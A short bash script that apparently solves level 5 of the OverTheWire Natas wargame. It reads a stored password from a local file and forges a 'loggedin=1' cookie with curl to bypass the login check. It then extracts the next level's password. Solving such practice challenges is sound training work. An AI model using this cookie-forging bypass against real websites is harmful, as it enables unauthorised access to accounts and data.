#!/bin/bash

curl -u natas5:$(cat keys/cinco) --cookie "loggedin=1" -c natas5.cookie http://natas5.natas.labs.overthewire.org/ 2>/dev/null | grep natas6

